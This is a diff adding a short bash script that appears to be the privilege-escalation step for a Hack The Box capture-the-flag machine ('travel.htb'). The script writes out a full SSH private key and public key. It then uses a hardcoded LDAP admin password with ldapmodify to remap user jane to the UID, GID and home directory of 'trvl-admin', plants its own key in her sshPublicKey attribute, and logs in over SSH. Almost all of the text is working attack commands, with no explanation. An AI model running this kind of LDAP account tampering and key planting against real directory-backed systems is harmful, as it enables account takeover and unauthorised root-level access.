@@ -1,0 +1,66 @@
+#!/bin/bash
+
+ssh_public_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCHtkd8s52uvd5zuCIgf0e8nm38SLNIKLd4l/v4Xzi6ONcGQbsFE15J54fEuNdZZOQV4CQZ0a20tDz7cPx/S+vItI/dxcxOl0UWKHn6ut6gH2Tj0P4hutXEBkqF0BsPpQhzD9ZXb3CtRTWYnjycmPLs+VKvSjICH0ZHTrgYHeArs2XQ18ZHCBIUlO1a9wkQjDbD0oyPLjiqRd856ktOQ7RX5wyHeY3eXDm539tqdPNJvWzkCzF8ncLDaKBRDwua+OtZS/1xA6m4WLiEYYBVtS+S9xKjIbbU0HMONWykMvFhb8jx8ULb5KKLUbW0wx9FJsSHbgUSwHRegh8RmqRCOQaVZH8fo6bwsw2YKtKjDzTL8E4gqv3opbItxQ4FEUsvj3kW6Bcxmoo4y+yrHJf+YJsbZUn0Q5UVV+XVHAnOOuUnmv6LAOisxKpS7/F/m3oC6m95Jx45TFCKx+c9Avo7+S+llbdegaUAF31Hyspy70tjV75UXfF2Q9IDrCERAxQAQU="
+
+echo "${ssh_public_key}" > id_rsa.pub
+
+echo "-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----" > id_rsa
+chmod 600 id_rsa
+
+echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify
+replace: uidNumber
+uidNumber: 1000
+-
+replace: gidNumber
+gidNumber: 1000
+-
+replace: homeDirectory
+homeDirectory: /home/trvl-admin
+-
+add: objectClass
+objectClass: ldapPublicKey" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x
+
+echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify
+replace: sshPublicKey
+sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x
+
+ssh -o "IdentitiesOnly=yes" -i ./id_rsa jane@localhost
